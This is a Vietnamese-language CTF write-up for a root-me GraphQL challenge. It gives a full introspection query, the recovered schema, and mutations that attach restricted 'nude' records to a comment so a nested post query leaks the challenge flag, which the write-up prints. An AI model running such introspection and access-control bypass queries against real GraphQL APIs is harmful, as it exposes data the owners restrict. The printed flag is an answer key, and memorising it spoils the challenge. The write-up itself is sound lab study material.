# root-me GraphQL

**endpoint**: http://challenge01.root-me.org/web-serveur/ch66/web-serveur/ch66/api/graphql

**trigger**:
```json
{"query": "{__schema}"}
```
**results**:
```json
"errors":[{"message":"Field \"__schema\" of type \"__Schema!\" must have a selection of subfields. Did you mean \"__schema { ... }\"?","locations":[
```
Có dính lỗi graphql injection

Dùng tiếp graphql introspection để đọc cấu trúc của database
```json
{
"query": "fragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\nquery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}"
}
```

Tóm gọn, ta được structure sau:

*Fields* user gồm các *args* sau:
```json
{
"query": "{user {id, username, email, createdAt, updatedAt}}"
}
```
*Fields* `post` gồm các *args* sau:
```json
{
"query": "{post {id, userId, slug, name, content, createdAt, updatedAt}}"
}
```
*Fields* `nude` gồm các *args* sau:
```json
{
"query": "{nude {id, flag, content, createdAt, updatedAt}}"
}
```
*Fields* `comment` gồm các *args* sau:
```json
{
"query": "{comment {id, userId, postId, comment, nude, createdAt, updatedAt}}"
}
```

Ta biêt rằng `flag` nằm ở field `nude `tuy nhiên khi query trực tiếp tuy nhiên sau khi thử fuzz thì  nhận thấy user hiện tại chỉ có quyền thực hiện quyền truy vẫn `user` và `post`, không thể trực tiếp truy vẫn `nude` và comment

Ta biết rằng structure của field `user` không hề có password hay token để truy vấn nên direction không phải là chiếm tài khoản admin.

Từ đó mình nghĩ đến khả năng, mình sẽ add một `comment` có chứa `nude` vào và sau đó đọc `comment` đó để có được `flag`. Tuy nhiên, làm thế nào để có thể đọc được comments, trong khi mình chỉ có thể truy vấn vào `users và posts`. Sau khi kiểm tra lại `Introspection` một lần nữa thì mình phát hiện *comments có thể truy vấn được từ post*, không cần phải truy vấn trực tiếp.
```json
"name":"createComment",
"description":"The mutation that allows you to create a new Comment",
"args":[
	{"name":"userId"}, 
	{"name":"postId"}, 
	{"name":"nudeId"}, 
	{"name":"comment"} 
],
```

```json
"name":"createPost",
"description":"The mutation that allows you to create a new Post",
"args":[
	{"name":"userId"},
	{"name":"slug"},
	{"name":"name"},
	{"name":"content"},
```
### Và sau đó mình nghĩ đến solution như sau:

1. Tiến hành truy vấn posts để xác định id của posts được user quản lí.
2. Thực hiện add comments bao gồm cả nude để chứa flag vào comments của post tương ứng mình có thể control.
3. Truy vấn lại post, truy vấn đến thông tin cả comments của posts.



**Info**: (userId: 2, postId: 7)
```json
{
"query": "mutation { createComment (userId: 2, postId: 7, nudeId: 1, comment: \"test\"){comment}}"
}
// created comment test
{
"query": "mutation { createComment (userId: 2, postId: 7, nudeId: 2, comment: \"test1\"){comment}}"
}
// created comment test1
```

**Đọc flag**:
```json
{
"query": "{post {comments {nude {id, flag}}}}"
}
```

**flag**: 
```json
"comments":[{"nude":[{"id":1,"flag":"You're too strong, but my nude is not here"}]},{"nude":[{"id":2,"flag":"GraphQLDoesNeedAccessControl!!!!!!"}]
```

Dài dòng, lê thê là vì mình chưa thực sự chai dạng này

**References**: https://thanhlocpanda.wordpress.com/2021/01/14/graphql-injection-khai-niem-va-challenge-root-me/


#### Tóm tắt
1. Trigger graphql injection thành công

2. Dùng introspection query đọc hết structure của graphql

3. Nhận thấy hướng giải không phải là chiếm tài khoản admin mà là cần đọc field chứa flag là `nude`.

4. Fuzz tiếp thì biết được user hiện tại chỉ có quyền truy vẫn trực tiếp 2 fields là `user` và `post`. không thể query nude hay comment trực tiếp.

5. Thấy được flow rằng `nude` thuộc `comment` thuộc `post` nên ta có thể query đến bằng cách nested này.

6. Vì chỉ post của `admin` chứa `nude` nên ta cần tạo `comments` chứa field `nude` nhằm hứng `flag` bị leak ra này.

7. Dùng `mutation` schema write
```json
"mutation {post (){comment}}"
``` 

8. Đọc
```json
"{post {comments {nude {flag}}}}"
```

8. Thấy vẫn chưa có flag tạo tiếp field `nude` thứ 2.

9. Đọc -> flag
